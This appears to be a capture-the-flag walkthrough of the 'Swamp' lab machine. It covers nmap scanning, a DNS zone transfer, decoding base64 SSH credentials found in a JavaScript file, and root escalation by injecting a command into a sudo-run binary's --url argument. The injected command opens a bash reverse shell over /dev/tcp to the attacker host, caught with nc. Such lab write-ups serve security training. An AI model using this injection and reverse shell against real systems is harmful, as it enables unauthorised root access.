---
description: 'Difficulty: Easy'
---

# Swamp

### Recon

1. We begin by performing a network scan to identify the host of the victim machine:

```bash
sudo nmap -sn 192.168.56.0/24
```

* Host identificados:
  * 192.168.56.1
  * 192.168.56.100
  * 192.168.56.102 (target)
  * 192.168.56.101 (our Kali machine)

2. We performed a scan with nmap:

```bash
sudo nmap -sCV -p- --open -T5 192.168.56.102
```

* Command breakdown:
  * -sC: Runs the default nmap scripts (NSE, Nmap Scripting Engine), focused on basic information and detection of common vulnerabilities.
  * -sV: Detects the version of services running on open ports.
  * -p-: Scans all possible TCP ports (from 1 to 65535), not just the most common ones.
  * \--open: Shows only the ports that are open, hiding those that are closed/filtered.
  * -T5: Uses “maximum speed” for scanning, reducing wait times between tests. This is the most aggressive level and can generate more network traffic.

<figure><img src="../../../.gitbook/assets/image (649).png" alt=""><figcaption></figcaption></figure>

* Identified ports:
  * 22/tcp
  * 53/tcp
  * 80/tcp

3. The open port 80 indicates that there is a website, and there is a redirect to the domain swamp.nyx. We will add it to the /etc/hosts file on our attacking machine:

<figure><img src="../../../.gitbook/assets/image (650).png" alt=""><figcaption></figcaption></figure>

4. We verify this by accessing it from the browser of the attacking machine:

<figure><img src="../../../.gitbook/assets/image (651).png" alt=""><figcaption></figcaption></figure>

### DNS Zone Transfer

1. With this type of attack, we will attempt to obtain information from the DNS domain (for example, subdomains).

```bash
dig axfr swamp.nyx @192.168.56.102
```

<figure><img src="../../../.gitbook/assets/image (652).png" alt=""><figcaption></figcaption></figure>

2. We discovered multiple subdomains, we will add them to the /etc/hosts file:

<figure><img src="../../../.gitbook/assets/image (653).png" alt=""><figcaption></figcaption></figure>

* We see that the subdomains refer to the movie Shrek (the swamp, the donkey, Fiona, etc.). We can enter the added subdomains.

3. We visit farfaraway.swamp.nyx from the browser:

<figure><img src="../../../.gitbook/assets/image (654).png" alt=""><figcaption></figcaption></figure>

4. We inspect the source code of the page and see that the script.js file is imported:

<figure><img src="../../../.gitbook/assets/image (655).png" alt=""><figcaption></figcaption></figure>

5. We analyzed the file code in the Debugger and located the following encoded string:

<figure><img src="../../../.gitbook/assets/image (656).png" alt=""><figcaption></figcaption></figure>

6. It appears to be encoded in base64, so let's decode it:

```bash
base64 -d <<< 'c2hyZWs6cHV0b3Blc2FvZWxhc25v' ;echo
```

* We obtain the credentials shrek:putopesaoelasno

7. Previously, we identified that port 22/tcp is open, which is the port used for the SSH service. We will attempt to access it with the credentials we have obtained.

```bash
ssh shrek@192.168.56.102
putopesaoelasno
```

<figure><img src="../../../.gitbook/assets/image (657).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (658).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

1. We have gained access to the target system with the user shrek. Let's see if we can run as root.

<figure><img src="../../../.gitbook/assets/image (659).png" alt=""><figcaption></figcaption></figure>

* It is identified that the header\_checker binary can be executed.

2. We checked that it needs header\_checker to run:

<figure><img src="../../../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

3. Let's try to see what header\_checker does:

<figure><img src="../../../.gitbook/assets/image (661).png" alt=""><figcaption></figcaption></figure>

* What header\_checker is doing is a curl.

4. We will try to inject a command right after using the binary to see if it executes:

<figure><img src="../../../.gitbook/assets/image (662).png" alt=""><figcaption></figcaption></figure>

* We execute the command as root, so we could inject commands that run as root on the target system.

5. We put another console on our attacking machine to listen:

```bash
nc -lvnp 4444
```

<figure><img src="../../../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>

6. From the terminal with the SSH session shrek@swamp, we run the command to receive the connection on the attacking machine:

```bash
sudo /home/shrek/header_checker --url "google.es; bash -c \"bash -i >& /dev/tcp/192.168.56.101/4444 0>&1\""
```

<figure><img src="../../../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (665).png" alt=""><figcaption></figcaption></figure>

7. We can execute commands on the target system:

<figure><img src="../../../.gitbook/assets/image (666).png" alt=""><figcaption></figcaption></figure>

* We display the contents of user.txt, which is one of the flags.

8. We search for and display the flag **root.txt**, which would be the other one we would have left:

```bash
find / -name root.txt 2>/dev/null |xargs cat
```

<figure><img src="../../../.gitbook/assets/image (667).png" alt=""><figcaption></figcaption></figure>
